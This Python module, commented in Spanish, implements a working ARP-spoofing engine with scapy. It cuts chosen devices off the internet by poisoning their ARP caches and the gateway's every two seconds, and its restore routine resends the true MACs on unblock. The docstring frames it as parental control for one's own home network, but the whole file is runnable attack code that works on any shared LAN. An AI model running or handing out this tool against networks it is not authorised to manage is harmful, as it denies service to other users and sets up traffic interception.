"""Motor de bloqueo por ARP spoofing, dirigido a equipos concretos.

Cómo funciona el bloqueo
------------------------
Para cortar la salida a internet de UN equipo, se envenena su caché ARP
diciéndole que el gateway está en la MAC de ESTA máquina. Como NO
reenviamos ese tráfico (IP forwarding desactivado), los paquetes del
equipo hacia internet se descartan: queda sin conexión.

Al desbloquear se reenvían anuncios ARP con las MAC correctas para
restaurar la caché de inmediato.

Uso previsto: tu propia red doméstica (control parental).
"""
from __future__ import annotations

import os
import threading
import time
from typing import Optional

from scapy.all import ARP, Ether, send, sendp

from . import netutils

POISON_INTERVAL = 2.0   # segundos entre reenvíos del engaño
RESTORE_ROUNDS = 5      # paquetes de restauración al desbloquear


class Blocker:
    def __init__(self, info: netutils.NetInfo):
        self.info = info
        self.dry_run = os.environ.get("DRY_RUN") == "1"
        # ip -> mac de los equipos actualmente bloqueados
        self._targets: dict[str, str] = {}
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    # ---- API pública -------------------------------------------------
    def start(self):
        if self.dry_run:
            return
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def block(self, ip: str, mac: str) -> bool:
        if ip == self.info.gateway_ip or ip == self.info.own_ip:
            return False  # nunca bloquear el gateway ni a uno mismo
        with self._lock:
            self._targets[ip] = mac
        if not self.dry_run:
            self._poison_once(ip, mac)
        return True

    def unblock(self, ip: str) -> bool:
        with self._lock:
            mac = self._targets.pop(ip, None)
        if mac is None:
            return False
        if not self.dry_run:
            self._restore(ip, mac)
        return True

    def is_blocked(self, ip: str) -> bool:
        with self._lock:
            return ip in self._targets

    def blocked_ips(self) -> list[str]:
        with self._lock:
            return list(self._targets.keys())

    def shutdown(self):
        """Detiene el motor y restaura TODOS los equipos (importante)."""
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
        with self._lock:
            targets = dict(self._targets)
            self._targets.clear()
        if not self.dry_run:
            for ip, mac in targets.items():
                self._restore(ip, mac)

    # ---- Internos ----------------------------------------------------
    def _loop(self):
        while not self._stop.is_set():
            with self._lock:
                targets = list(self._targets.items())
            for ip, mac in targets:
                self._poison_once(ip, mac)
            self._stop.wait(POISON_INTERVAL)

    def _poison_once(self, ip: str, mac: str):
        """Envenena la caché del objetivo (y la del gateway) hacia nuestra MAC."""
        # Al objetivo: "el gateway soy yo"
        send(
            ARP(op=2, pdst=ip, hwdst=mac,
                psrc=self.info.gateway_ip, hwsrc=self.info.own_mac),
            verbose=False,
        )
        # Al gateway: "el objetivo soy yo" (corte bidireccional)
        if self.info.gateway_mac:
            send(
                ARP(op=2, pdst=self.info.gateway_ip, hwdst=self.info.gateway_mac,
                    psrc=ip, hwsrc=self.info.own_mac),
                verbose=False,
            )

    def _restore(self, ip: str, mac: str):
        """Reenvía ARP con las MAC verdaderas para restaurar la conexión."""
        if not self.info.gateway_mac:
            return
        pkt_to_target = ARP(
            op=2, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff",
            psrc=self.info.gateway_ip, hwsrc=self.info.gateway_mac,
        )
        pkt_to_gateway = ARP(
            op=2, pdst=self.info.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
            psrc=ip, hwsrc=mac,
        )
        for _ in range(RESTORE_ROUNDS):
            send(pkt_to_target, verbose=False)
            send(pkt_to_gateway, verbose=False)
            time.sleep(0.2)
